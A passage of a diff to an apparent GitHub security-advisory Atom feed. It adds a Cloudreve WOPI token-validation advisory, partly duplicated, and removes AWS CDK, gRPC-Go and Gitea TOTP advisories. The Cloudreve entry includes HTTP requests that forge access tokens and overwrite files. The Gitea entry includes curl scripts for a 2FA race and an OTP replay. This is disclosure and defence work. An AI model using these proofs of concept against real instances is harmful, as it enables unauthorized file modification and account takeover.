+<li>Enforce that flag on <code>POST /contents</code>, <code>PUT_RELATIVE</code>, <code>LOCK</code>, and other write operations.</li>
+<li>Include session-level write permission when returning WOPI <code>FileInfo</code> fields such as <code>ReadOnly</code> and <code>UserCanWrite</code>.</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/cloudreve/cloudreve/security/advisories/GHSA-c3jm-gv5r-9wcp">https://github.com/cloudreve/cloudreve/security/advisories/GHSA-c3jm-gv5r-9wcp</a></li>
+<li><a href="https://github.com/cloudreve/cloudreve/commit/f3347130ac48f2ff996af9ef66c97be2dda9cba9">https://github.com/cloudreve/cloudreve/commit/f3347130ac48f2ff996af9ef66c97be2dda9cba9</a></li>
+<li><a href="https://github.com/advisories/GHSA-c3jm-gv5r-9wcp">https://github.com/advisories/GHSA-c3jm-gv5r-9wcp</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-c3jm-gv5r-9wcp</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-07-24T21:18:41.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/cloudreve/Cloudreve/v4] Cloudreve WOPI view sessions can write files and WOPI access token secret is ignored]]></title>
+        <id>https://github.com/advisories/GHSA-c3jm-gv5r-9wcp</id>
+        <link href="https://github.com/advisories/GHSA-c3jm-gv5r-9wcp"/>
+        <updated>2026-07-24T21:18:42.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>Cloudreve WOPI access tokens are generated as <code>&lt;session-id&gt;.&lt;random-secret&gt;</code>, but the WOPI middleware validates only the session id prefix and never compares the supplied token to the stored token. In addition, a WOPI viewer session does not store or enforce the requested viewer action. A session created for a view or preview action can still call WOPI write routes if the underlying file is writable by the session user.</p>
+<h2 id="impact">Impact</h2>
+<p>A WOPI integration that is only expected to view a user's file can modify that file through the WOPI write endpoints. If the WOPI URL or session id leaks, the random token suffix does not protect the session because any suffix is accepted for an existing session id.</p>
+<p>This affects deployments that configure WOPI viewers for user files. The attacker primitive is strongest when a malicious or compromised WOPI viewer receives a view-only URL and then writes content back to Cloudreve.</p>
+<h2 id="affected-version">Affected version</h2>
+<p>Verified in source and runtime on latest master commit <code>ba2e870bbd17f1918dd2321de861e453f696d6a3</code> and latest observed tag <code>4.16.1</code>.</p>
+<h2 id="technical-details">Technical details</h2>
+<p>Cloudreve creates WOPI viewer sessions in <code>pkg/filemanager/manager/viewer.go</code>:</p>
+<pre><code class="language-go">sessionID := uuid.Must(uuid.NewV4()).String()
+token := util.RandStringRunesCrypto(128)
+sessionCache := &amp;ViewerSessionCache{
+    ID:       sessionID,
+    Uri:      file.Uri(false).String(),
+    UserID:   m.user.ID,
+    ViewerID: viewer.ID,
+    FileID:   file.ID(),
+    Version:  version,
+    Token:    fmt.Sprintf("%s.%s", sessionID, token),
+}
+</code></pre>
+<p>The token includes a 128-character random suffix, but <code>middleware.ViewerSessionValidation()</code> only uses the prefix before the dot:</p>
+<pre><code class="language-go">accessToken := strings.Split(c.Query(wopi.AccessTokenQuery), ".")
+if len(accessToken) != 2 {
+    ...
+}
+
+sessionRaw, exist := store.Get(manager.ViewerSessionCachePrefix + accessToken[0])
+</code></pre>
+<p>The middleware checks that the file id matches the loaded session, but it never compares <code>c.Query("access_token")</code> with <code>session.Token</code>. As a result, <code>&lt;valid-session-id&gt;.anything</code> is accepted.</p>
+<p>The WOPI routes are exposed without normal session authentication and rely on this middleware:</p>
+<pre><code class="language-go">wopi := noAuth.Group("file/wopi", middleware.HashID(hashid.FileID), middleware.ViewerSessionValidation())
+wopi.GET(":id", controllers.CheckFileInfo)
+wopi.GET(":id/contents", controllers.GetFile)
+wopi.POST(":id/contents", controllers.PutFile)
+wopi.POST(":id", controllers.ModifyFile)
+</code></pre>
+<p>The write routes are not protected by a session-level write check. <code>CreateViewerSessionService</code> accepts <code>preferred_action</code>, but <code>ViewerSessionCache</code> has no action or write-permission field and <code>CreateViewerSession</code> does not persist the chosen action. The requested action is only used to generate the WOPI source URL:</p>
+<pre><code class="language-go">wopiSrc, err := wopi.GenerateWopiSrc(c, s.PreferredAction, targetViewer, viewerSession)
+</code></pre>
+<p><code>WopiService.PutContent()</code> checks only the underlying filesystem upload capability:</p>
+<pre><code class="language-go">file, err := m.Get(c, uri, dbfs.WithRequiredCapabilities(dbfs.NavigatorCapabilityUploadFile), dbfs.WithNotRoot())
+</code></pre>
+<p>It does not check whether the WOPI session was created for an edit action.</p>
+<h2 id="reproduction">Reproduction</h2>
+<p>The following sequence was verified against a disposable local Cloudreve instance built from the affected commit.</p>
+<ol>
+<li>Configure a WOPI viewer in Cloudreve.</li>
+<li>Create a user-owned file, for example <code>cloudreve://my/wopi.txt</code>, containing <code>original content</code>.</li>
+<li>Create a viewer session with <code>preferred_action</code> set to <code>view</code>:</li>
+</ol>
+<pre><code class="language-http">PUT /api/v4/file/viewerSession HTTP/1.1
+Authorization: Bearer &lt;user-token&gt;
+Content-Type: application/json
+
+{
+  "uri": "cloudreve://my/wopi.txt",
+  "version": "",
+  "viewer_id": "poc-wopi",
+  "preferred_action": "view"
+}
+</code></pre>
+<p>Observed response:</p>
+<pre><code class="language-json">{
+  "session": {
+    "id": "a2d03f1b-e310-4b2a-9baf-38556fa2d5d1",
+    "access_token": "a2d03f1b-e310-4b2a-9baf-38556fa2d5d1.&lt;128-char-random-secret&gt;"
+  }
+}
+</code></pre>
+<ol start="4">
+<li>Replace the token suffix with any value:</li>
+</ol>
+<pre><code class="language-http">GET /api/v4/file/wopi/4xc5?access_token=a2d03f1b-e310-4b2a-9baf-38556fa2d5d1.forged_suffix_accepted HTTP/1.1
+</code></pre>
+<p>Observed response: <code>200 OK</code>. The same request with an unknown session id returned <code>403 Forbidden</code>, confirming the middleware validates the session id prefix but ignores the secret suffix.</p>
+<ol start="5">
+<li>Use the forged token from the view-created session to read content:</li>
+</ol>
+<pre><code class="language-http">GET /api/v4/file/wopi/4xc5/contents?access_token=a2d03f1b-e310-4b2a-9baf-38556fa2d5d1.forged_suffix_accepted HTTP/1.1
+</code></pre>
+<p>Observed response:</p>
+<pre><code class="language-http">HTTP/1.1 200 OK
+Content-Length: 16
+Etag: "1bIo"
+
+original content
+</code></pre>
+<ol start="6">
+<li>Use the same forged token from the view-created session to write content:</li>
+</ol>
+<pre><code class="language-http">POST /api/v4/file/wopi/4xc5/contents?access_token=a2d03f1b-e310-4b2a-9baf-38556fa2d5d1.forged_suffix_accepted HTTP/1.1
+X-WOPI-Lock: cloudreve-poc
+Content-Type: application/octet-stream
+
+runtime modified via view session forged suffix
+</code></pre>
+<p>Observed response:</p>
+<pre><code class="language-http">HTTP/1.1 200 OK
+X-Wopi-Itemversion: nBc0
+</code></pre>
+<ol start="7">
+<li>Read back the modified file with the forged token:</li>
+</ol>
+<pre><code class="language-http">GET /api/v4/file/wopi/4xc5/contents?access_token=a2d03f1b-e310-4b2a-9baf-38556fa2d5d1.forged_suffix_accepted HTTP/1.1
+</code></pre>
+<p>Observed response:</p>
+<pre><code class="language-http">HTTP/1.1 200 OK
+Content-Length: 47
+Etag: "nBc0"
+
+runtime modified via view session forged suffix
+</code></pre>
+<p>This proves both authorization failures: the random token suffix is ignored, and a view-created WOPI session can reach the content write sink.</p>
+<h2 id="root-cause">Root cause</h2>
+<p>Two authorization values are generated or accepted but not enforced:</p>
+<ol>
+<li>The random WOPI token suffix is generated and stored but never compared during WOPI request validation.</li>
+<li>The requested WOPI action is accepted during session creation but not persisted or enforced on WOPI write routes.</li>
+</ol>
+<h2 id="remediation">Remediation</h2>
+<ul>
+<li>Compare the full supplied <code>access_token</code> to the stored <code>ViewerSessionCache.Token</code> using constant-time comparison.</li>
+<li>Reject malformed tokens and tokens with extra separators.</li>
+<li>Store a <code>CanWrite</code> flag or selected WOPI action in <code>ViewerSessionCache</code>.</li>
+<li>Enforce that flag on <code>POST /contents</code>, <code>PUT_RELATIVE</code>, <code>LOCK</code>, and other write operations.</li>
+<li>Include session-level write permission when returning WOPI <code>FileInfo</code> fields such as <code>ReadOnly</code> and <code>UserCanWrite</code>.</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/cloudreve/cloudreve/security/advisories/GHSA-c3jm-gv5r-9wcp">https://github.com/cloudreve/cloudreve/security/advisories/GHSA-c3jm-gv5r-9wcp</a></li>
+<li><a href="https://github.com/cloudreve/cloudreve/commit/f3347130ac48f2ff996af9ef66c97be2dda9cba9">https://github.com/cloudreve/cloudreve/commit/f3347130ac48f2ff996af9ef66c97be2dda9cba9</a></li>
+<li><a href="https://github.com/advisories/GHSA-c3jm-gv5r-9wcp">https://github.com/advisories/GHSA-c3jm-gv5r-9wcp</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-c3jm-gv5r-9wcp</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-07-24T21:18:41.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[github.com/quic-go/webtransport-go] webtransport-go: Memory Exhaustion Attack due to Buffering of Unknown Capsules]]></title>
         <id>https://github.com/advisories/GHSA-g35j-m5xg-vh3q</id>
@@ -1795,650 +2486,5 @@ Any system that converts a CEL evaluation result to JSON (e.g. via <code>structp
         </author>
         <category label="severity" term="LOW"/>
         <published>2026-07-24T16:44:20.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/aws/aws-cdk-go/awscdk/v2] AWS CDK CodeBuild S3 Log Encryption Boolean Inversion]]></title>
-        <id>https://github.com/advisories/GHSA-464c-974j-9xm6</id>
-        <link href="https://github.com/advisories/GHSA-464c-974j-9xm6"/>
-        <updated>2026-07-24T16:44:21.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>The AWS Cloud Development Kit (AWS CDK) is an open-source software development framework for defining cloud infrastructure in code and provisioning it through AWS CloudFormation. We identified an issue in which explicitly setting <code>encrypted: true</code> on the <code>S3LoggingOptions</code> property of an AWS CodeBuild project construct produces the opposite of the intended behavior, disabling encryption on CodeBuild build logs stored in S3.</p>
-<h2 id="impact">Impact</h2>
-<p>The <code>S3LoggingOptions.encrypted</code> property in the <code>aws-codebuild</code> module uses positive polarity (<code>true</code> = encryption ON), but is mapped directly to the CloudFormation <code>S3LogsConfig.EncryptionDisabled</code> field, which uses negative polarity (<code>true</code> = encryption OFF). Because the value is not negated before being passed to CloudFormation, any explicit assignment produces inverted behavior:</p>
-<ul>
-<li><p>Setting <code>encrypted: true</code> (intending encryption ON) causes CloudFormation to receive <code>EncryptionDisabled: true</code>, disabling encryption.</p>
-</li>
-<li><p>Setting <code>encrypted: false</code> (intending encryption OFF) causes CloudFormation to receive <code>EncryptionDisabled: false</code>, enabling encryption.</p>
-</li>
-</ul>
-<p>Users who omit the property entirely are not affected, as <code>undefined</code> passes through to CloudFormation, which defaults to encryption enabled.</p>
-<p>Users affected by this issue could have CodeBuild S3 build logs stored using SSE-S3 (Amazon S3-managed keys, AES-256) rather than the AWS managed keys that CodeBuild applies by default. Since January 5, 2023, Amazon S3 automatically encrypts all new object uploads with SSE-S3, so logs written after that date remain encrypted at rest. However, logs written prior to that date to buckets that did not have default encryption configured at the time are potentially not encrypted at rest.</p>
-<p>Impacted versions: &gt;= 1.75.0 and &lt;= 2.252.0</p>
-<h2 id="patches">Patches</h2>
-<p>This issue has been addressed in <code>aws-cdk-lib</code> version 2.253.0. Upgrade to the latest version and ensure any forked or derivative code is patched to incorporate the new fixes.</p>
-<h2 id="workarounds">Workarounds</h2>
-<p>Users who are unable to immediately upgrade to version 2.253.0 should omit the <code>encrypted</code> property from their <code>S3LoggingOptions</code> configuration entirely. When the property is omitted, the value is not passed to CloudFormation, and CodeBuild applies its default behavior of encrypting build logs using AWS managed keys.</p>
-<h2 id="references">References</h2>
-<p>If you have any questions or comments about this advisory, contact AWS Security via our issue reporting page [1] or directly via email to <a href="mailto:aws-security@amazon.com">aws-security@amazon.com</a>. Please do not create a public GitHub issue.</p>
-<p>[1] <a href="https://aws.amazon.com/security/vulnerability-reporting/">https://aws.amazon.com/security/vulnerability-reporting/</a></p>
-<h2 id="acknowledgement">Acknowledgement</h2>
-<p>AWS thanks AISafe for collaborating on this issue through the coordinated disclosure process.</p>
-<h3 id="references-1">References</h3>
-<ul>
-<li><a href="https://github.com/aws/aws-cdk/security/advisories/GHSA-464c-974j-9xm6">https://github.com/aws/aws-cdk/security/advisories/GHSA-464c-974j-9xm6</a></li>
-<li><a href="https://github.com/aws/aws-cdk/pull/37761">https://github.com/aws/aws-cdk/pull/37761</a></li>
-<li><a href="https://github.com/aws/aws-cdk/commit/40319185dc645d2afc6acf1d25547a86250e97af">https://github.com/aws/aws-cdk/commit/40319185dc645d2afc6acf1d25547a86250e97af</a></li>
-<li><a href="https://github.com/aws/aws-cdk/releases/tag/v2.253.0">https://github.com/aws/aws-cdk/releases/tag/v2.253.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-464c-974j-9xm6">https://github.com/advisories/GHSA-464c-974j-9xm6</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-464c-974j-9xm6</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-07-24T16:44:20.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[google.golang.org/grpc] gRPC-Go: xDS RBAC and HTTP/2 Vulnerabilities]]></title>
-        <id>https://github.com/advisories/GHSA-hrxh-6v49-42gf</id>
-        <link href="https://github.com/advisories/GHSA-hrxh-6v49-42gf"/>
-        <updated>2026-07-21T22:03:58.000Z</updated>
-        <content type="html"><![CDATA[<p>Multiple security vulnerabilities have been identified and addressed in grpc-go affecting the xDS RBAC authorization engine (internal/xds/rbac) and the HTTP/2 transport server implementation (internal/transport). These vulnerabilities could result in:</p>
-<ul>
-<li>Authorization Bypass (Fail-Open) when translating xDS RBAC policies containing <code>Metadata</code> or <code>RequestedServerName</code> fields.</li>
-<li>Denial of Service (High CPU Consumption) due to an HTTP/2 Rapid Reset mitigation bypass during client-initiated stream resets.</li>
-<li>Denial of Service (Server Panic) when parsing crafted xDS RBAC policies containing <code>NOT</code> rules around unsupported fields.</li>
-</ul>
-<h3 id="impact">Impact</h3>
-<p><em>What kind of vulnerability is it? Who is impacted?</em></p>
-<h4 id="xds-rbac-authorization-bypass-via-metadata--requestedservername-matchers">xDS RBAC Authorization Bypass via <code>Metadata</code> &amp; <code>RequestedServerName</code> matchers</h4>
-<ul>
-<li>Affected Component: xDS RBAC </li>
-<li>Impact: When building policy matchers for gRPC RBAC from xDS configurations, unsupported <code>permission</code> and <code>principal</code> rules (specifically <code>Metadata</code> and <code>RequestedServerName</code>) were silently ignored and treated as no-ops.<ul>
-<li>If an authorization policy relied purely on these matchers for access control, treating those rules as no-ops effectively removed the restrictions.</li>
-</ul>
-</li>
-<li>If these unsupported rules were nested inside logical <code>NOT</code> rules (<code>Permission_NotRule</code> / <code>Principal_NotId</code>) or multi-condition <code>OR/AND</code> rules, silently dropping them changed the boolean logic flow of the authorization engine.</li>
-</ul>
-<p>As a result, policy evaluation decisions could fail open, allowing unauthorized clients to access protected gRPC services or resources.</p>
-<h4 id="http2-rapid-reset-mitigation-bypass--denial-of-service-via-stream-aborts">HTTP/2 Rapid Reset Mitigation Bypass / Denial of Service via Stream Aborts</h4>
-<ul>
-<li>Affected Component: HTTP/2 transport</li>
-<li>Impact: Earlier mitigations in grpc-go for HTTP/2 Rapid Reset only applied threshold checks to items that directly resulted in control frames being written back to the wire, such as <code>SETTINGS</code> ACKs or server-initiated <code>RST_STREAM</code>s.</li>
-</ul>
-<p>When a client initiated a rapid flood of stream creation (<code>HEADERS</code>) immediately followed by stream termination <code>RST_STREAM</code>, items queued up in the control buffer without counting against the transport response frame threshold. An attacker can repeatedly trigger this flood sequence to bypass reader blocking, resulting in high CPU usage, and Denial of Service (DoS).</p>
-<h4 id="denial-of-service-panic-in-xds-rbac-engine-via-unsupported-fields-inside-not-rules">Denial of Service (Panic) in xDS RBAC Engine via Unsupported Fields inside NOT Rules</h4>
-<ul>
-<li>Affected Component: xDS RBAC </li>
-<li>Impact: The xDS RBAC policy translators recursively generate matchers for nested rules. When a <code>NOT</code> rule wrapped an unsupported or unhandled field (such as <code>SourcedMetadata</code>), the recursive step returned an empty matcher. This could result in a runtime panic when the RBAC engine attempts to authorize an incoming request.</li>
-</ul>
-<p>An attacker or misconfigured/malicious xDS management server delivering an LDS/RDS update containing a <code>NOT</code> rule around an unhandled field causes the gRPC server process to crash immediately (CWE-248 / Denial of Service).</p>
-<h3 id="patches">Patches</h3>
-<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>
-<p>All three issues have been fixed in <code>master</code> and will be released in 1.82.1 shortly.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>
-<p>If upgrading grpc-go immediately is not possible, apply the following workarounds based on your deployment architecture:</p>
-<ul>
-<li>For xDS RBAC Vulnerabilities &amp; Panics: Ensure that upstream xDS management servers do not push RBAC policies containing <code>Metadata</code>, <code>RequestedServerName</code>, or <code>NOT</code> rules wrapping unsupported fields (such as <code>SourcedMetadata</code>) to grpc-go servers.</li>
-<li>For HTTP/2 Rapid Reset DOS: Configure upstream reverse proxies or load balancers (such as Envoy) with strict HTTP/2 <code>max_concurrent_streams</code> limits and active rate limiting on <code>RST_STREAM</code> frequency per connection.</li>
-</ul>
-<h3 id="severity">Severity</h3>
-<table>
-<thead>
-<tr>
-<th align="left">Vulnerability</th>
-<th align="left">Qualitative Severity</th>
-<th align="left">Approximate CVSS v3.1 Score</th>
-<th align="left">Primary Impact</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left"><strong>xDS RBAC Authorization Bypass</strong></td>
-<td align="left"><strong>High</strong></td>
-<td align="left"><code>8.2</code></td>
-<td align="left">Unauthorized Access / Fail-Open</td>
-</tr>
-<tr>
-<td align="left"><strong>HTTP/2 Rapid Reset DOS Bypass</strong></td>
-<td align="left"><strong>High</strong></td>
-<td align="left"><code>7.5</code></td>
-<td align="left">High CPU Consumption / Denial of Service</td>
-</tr>
-<tr>
-<td align="left"><strong>xDS RBAC Engine Server Panic</strong></td>
-<td align="left"><strong>Medium</strong></td>
-<td align="left"><code>5.9</code></td>
-<td align="left">Process Crash / Denial of Service</td>
-</tr>
-</tbody></table>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/grpc/grpc-go/security/advisories/GHSA-hrxh-6v49-42gf">https://github.com/grpc/grpc-go/security/advisories/GHSA-hrxh-6v49-42gf</a></li>
-<li><a href="https://github.com/grpc/grpc-go/pull/9236">https://github.com/grpc/grpc-go/pull/9236</a></li>
-<li><a href="https://github.com/grpc/grpc-go/commit/4ea465d4ab98013f72a142fe0fc89c19770b2935">https://github.com/grpc/grpc-go/commit/4ea465d4ab98013f72a142fe0fc89c19770b2935</a></li>
-<li><a href="https://github.com/grpc/grpc-go/releases/tag/v1.82.1">https://github.com/grpc/grpc-go/releases/tag/v1.82.1</a></li>
-<li><a href="https://github.com/advisories/GHSA-hrxh-6v49-42gf">https://github.com/advisories/GHSA-hrxh-6v49-42gf</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-hrxh-6v49-42gf</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-07-21T22:03:55.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[code.gitea.io/gitea] Gitea: TOTP TOCTOU race on web 2FA paths + missing replay check on Basic-Auth `X-Gitea-OTP` surface]]></title>
-        <id>https://github.com/advisories/GHSA-gx3v-q759-g323</id>
-        <link href="https://github.com/advisories/GHSA-gx3v-q759-g323"/>
-        <updated>2026-07-21T21:57:26.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>I'm reporting <strong>two related TOTP one-time-use defects</strong> in Gitea that survive the CVE-2021-45331 fix. The 2018 fix (PR #3878) introduced the <code>TwoFactor.LastUsedPasscode</code> field and added an in-memory inequality check on the web 2FA login path. That check works correctly in the single-request case, but it leaves two follow-up gaps:</p>
-<ol>
-<li><p><strong>A TOCTOU race on the web surfaces (Defect 1).</strong> The read-validate-check-save sequence against the <code>two_factor</code> row is not atomic. Two parallel submissions of the same passcode each load their own in-memory copy where <code>LastUsedPasscode</code> still holds the prior value; both pass the inequality check, both authenticate, and both then write the same new value back. Net effect: the same OTP redeems for two independent logged-in sessions.</p>
-</li>
-<li><p><strong>No <code>LastUsedPasscode</code> check at all on the Basic-Auth API surface (Defect 2).</strong> <code>services/auth/basic.go</code> calls <code>twofa.ValidateTOTP(...)</code> for <code>X-Gitea-OTP</code> without ever reading or writing <code>LastUsedPasscode</code>. The same six-digit code is replayable for the full <code>totp.Validate</code> acceptance window (~60–90 s with the default <code>Skew=1</code>). This is a clean <a href="https://datatracker.ietf.org/doc/html/rfc6238#section-5.2">RFC 6238 §5.2</a> violation independent of timing, shaped identically to the pre-CVE-2021-45331 behaviour but scoped to the API / Git-over-HTTPS basic-auth path instead of the web form.</p>
-</li>
-</ol>
-<p>Both defects post-date the 2018 fix; neither is referenced in any published Gitea advisory I could find. I'm filing this as a <strong>follow-up</strong> to CVE-2021-45331, not a duplicate.</p>
-<h3 id="vulnerable-code">Vulnerable code</h3>
-<h4 id="defect-1--toctou-race-on-web-2fa-login">Defect 1 — TOCTOU race on web 2FA login</h4>
-<p><code>routers/web/auth/2fa.go:55-88</code>:</p>
-<pre><code class="language-go">54  id := idSess.(int64)
-55  twofa, err := auth.GetTwoFactorByUID(ctx, id)             // (A) read row
-56  ...
-62  ok, err := twofa.ValidateTOTP(form.Passcode)              // (B) pure-function RFC 6238 check
-...
-68  if ok &amp;&amp; twofa.LastUsedPasscode != form.Passcode {        // (C) check against in-memory copy
-...
-84      twofa.LastUsedPasscode = form.Passcode                 // (D) mutate in-memory
-85      if err = auth.UpdateTwoFactor(ctx, twofa); err != nil {// (E) UPDATE … AllCols where id=?
-</code></pre>
-<p>Step (E) is plain <code>db.GetEngine(ctx).ID(t.ID).AllCols().Update(t)</code> (<code>models/auth/twofactor.go:128-131</code>) — no row lock, no <code>WHERE last_used_passcode = &lt;previous&gt;</code> predicate, and no DB uniqueness on <code>(uid, last_used_passcode)</code>. The model definition at <code>models/auth/twofactor.go:48-57</code> shows <code>LastUsedPasscode string</code> is a plain column — no constraint, no version field.</p>
-<h4 id="defect-1--same-shape-password-reset-2fa-re-auth">Defect 1 — same shape, password-reset 2FA re-auth</h4>
-<p><code>routers/web/auth/password.go:179-196</code> shows the identical pattern in the password-reset flow:</p>
-<pre><code class="language-go">179  passcode := ctx.FormString("passcode")
-180  ok, err := twofa.ValidateTOTP(passcode)
-...
-185  if !ok || twofa.LastUsedPasscode == passcode {           // same check-against-in-memory pattern
-...
-192  twofa.LastUsedPasscode = passcode
-193  if err = auth.UpdateTwoFactor(ctx, twofa); err != nil {
-</code></pre>
-<p>Same shape, same race window.</p>
-<h4 id="defect-2--basic-auth-api--git-over-https-stateless-replay--no-check-at-all">Defect 2 — Basic-Auth API / Git-over-HTTPS (stateless replay — no check at all)</h4>
-<p><code>services/auth/basic.go:170-185</code>:</p>
-<pre><code class="language-go">func validateTOTP(req *http.Request, u *user_model.User) error {
-    twofa, err := auth_model.GetTwoFactorByUID(req.Context(), u.ID)
-    ...
-    if ok, err := twofa.ValidateTOTP(req.Header.Get("X-Gitea-OTP")); err != nil {  // :179
-        return err
-    } else if !ok {
-        return util.NewInvalidArgumentErrorf("invalid provided OTP")
-    }
-    return nil
-}
-</code></pre>
-<p><code>LastUsedPasscode</code> is neither read nor written on this path. The same six-digit code in <code>X-Gitea-OTP</code> succeeds for the full <code>totp.Validate</code> acceptance window on every request.</p>
-<h4 id="why-the-existing-failed-login-counter-doesnt-catch-either-defect">Why the existing failed-login counter doesn't catch either defect</h4>
-<p>Gitea's <code>loginAttempts</code> counter increments on <strong>failed</strong> sign-ins. A successful replay is a success — the counter is never touched, and two parallel successes produce two access tokens with no anomaly logged at the auth layer.</p>
-<h3 id="race-window-analysis-defect-1">Race-window analysis (Defect 1)</h3>
-<p>Inside <code>TwoFactorPost</code>, the critical region between (A) <code>GetTwoFactorByUID</code> and (E) <code>UpdateTwoFactor</code> covers:</p>
-<ol>
-<li>one DB SELECT round-trip,</li>
-<li>base64-decode + AES-decrypt of the secret (<code>models/auth/twofactor.go:108-118</code>),</li>
-<li><code>totp.Validate</code> (HMAC-SHA1 over the secret + time-step),</li>
-<li><code>user_model.GetUserByID</code> (a second SELECT),</li>
-<li>optional <code>linkAccountFromContext</code> / OpenID link branch,</li>
-<li>the assignment + UPDATE.</li>
-</ol>
-<p>On a non-CPU-bound deployment this window is a few milliseconds on the fast path, tens of ms when <code>linkAccount</code> / OpenID branches are taken. An attacker who already holds both factors and can submit two <code>POST /user/two_factor</code> requests in parallel (HTTP/2 multiplexing, or two backgrounded curls) hits the race reliably — both goroutines enter step (C) with the same stale <code>LastUsedPasscode</code>, both reach step (D), both write the new value back. The two responses each set the user's session and <code>KeyUserHasTwoFactorAuth = true</code>.</p>
-<p>The same window exists on the password-reset flow (<code>routers/web/auth/password.go:179-193</code>).</p>
-<p>Defect 2 (basic-auth) is a different shape: no race needed. Every request that supplies the correct passcode within <code>totp.Validate</code>'s skew window succeeds, indefinitely, until the time-step rolls.</p>
-<h3 id="reachable-http-routes">Reachable HTTP routes</h3>
-<table>
-<thead>
-<tr>
-<th>Surface</th>
-<th>Route</th>
-<th>Defect</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Web 2FA login</td>
-<td><code>POST /user/two_factor</code> (<code>TwoFactorPost</code>)</td>
-<td>1 — TOCTOU race</td>
-</tr>
-<tr>
-<td>Password-reset 2FA re-auth</td>
-<td><code>POST /user/password/reset</code> (<code>ResetPasswdPost</code>) when <code>twofa</code> is set</td>
-<td>1 — TOCTOU race</td>
-</tr>
-<tr>
-<td>Basic-Auth API</td>
-<td>every API endpoint that accepts Basic auth with <code>X-Gitea-OTP</code> header (e.g. <code>/api/v1/user</code>, <code>/api/v1/users/{username}/tokens</code>)</td>
-<td>2 — stateless replay</td>
-</tr>
-<tr>
-<td>Git-over-HTTPS push/pull</td>
-<td>Basic-auth flow, same <code>X-Gitea-OTP</code> route into <code>services/auth/basic.go:validateTOTP</code></td>
-<td>2 — stateless replay</td>
-</tr>
-</tbody></table>
-<h3 id="proof-of-concept">Proof of concept</h3>
-<p>Pre-conditions: attacker has the victim's password (credential dump, phish, separate vuln) and one live TOTP value within the RFC 6238 window (AiTM relay such as Evilginx2, malicious browser extension, infostealer log, shoulder-surf). Network reach to the Gitea HTTP listener.</p>
-<h4 id="defect-1--web-2fa-race-parallel-curl">Defect 1 — Web 2FA race (parallel curl)</h4>
-<pre><code class="language-bash"># Step 1 — start a 2FA-pending session (password phase).
-curl -c jar.txt -b jar.txt -d 'user_name=alice&amp;password=&lt;known&gt;' \
-     https://gitea.example.com/user/login
-
-# Step 2 — fire two identical POSTs to /user/two_factor with the captured passcode.
-PASS=654321
-( curl -sS -c jar1.txt -b jar.txt -X POST \
-       -d "passcode=${PASS}" https://gitea.example.com/user/two_factor &amp; )
-( curl -sS -c jar2.txt -b jar.txt -X POST \
-       -d "passcode=${PASS}" https://gitea.example.com/user/two_factor &amp; )
-wait
-
-# Step 3 — both cookie jars now hold authenticated sessions for Alice.
-curl -b jar1.txt https://gitea.example.com/user/settings  # 200
-curl -b jar2.txt https://gitea.example.com/user/settings  # 200
-</code></pre>
-<p>Repeated trials succeed often enough to be exploitable; a kit firing N=5 parallel attempts hits the race on virtually every iteration. Note that the legitimate browser tab counts as one of the racers — the attacker's request only needs to arrive between the victim's (A) and the victim's (E).</p>
-<h4 id="defect-2--basic-auth-api-replay-no-race-needed">Defect 2 — Basic-Auth API replay (no race needed)</h4>
-<pre><code class="language-bash"># Attacker captured Alice's password + one live OTP (654321).
-# Within the RFC 6238 window (~60–90 s):
-curl -u "alice:&lt;known-password&gt;" \
-     -H "X-Gitea-OTP: 654321" \
-     https://gitea.example.com/api/v1/user
-# → 200 OK. Repeat as many times as the time-step allows.
-</code></pre>
-<p>Each call succeeds. An attacker can mint a personal access token via <code>POST /api/v1/users/{username}/tokens</code> inside that window for long-lived access that outlives the captured OTP.</p>
-<h3 id="impact">Impact</h3>
-<ul>
-<li><strong>Defect 1 (Web TOCTOU).</strong> Narrow exploit window but completely deterministic on parallel submission. The victim's own legitimate login is itself the trigger — no second observation of the OTP is needed if the attacker can race the victim's submission. Net effect: two authenticated sessions for one OTP, defeating RFC 6238 §5.2 in the multi-session case.</li>
-<li><strong>Defect 2 (Basic-Auth stateless replay).</strong> The more serious of the two. Any captured OTP value remains valid on the API / git-clone basic-auth surface for the full <code>totp.Validate</code> window. An attacker who AiTM-relays one login can carve out 60–90 s of unattended API access during which they can mint a personal access token and persist past the OTP window. This surface specifically attracts attackers because (a) it is non-interactive (a script can hammer it), and (b) PAT minting via <code>/api/v1/users/{username}/tokens</code> does not require a second 2FA prompt once basic-auth + OTP have succeeded.</li>
-<li><strong>Successful-replay invisibility.</strong> Gitea's failed-login counter increments on <code>FailedLoginException</code>; a successful replay never throws. The audit log records two successful 2FA authentications for the same principal at near-identical timestamps — most SIEM rules will not flag this.</li>
-</ul>
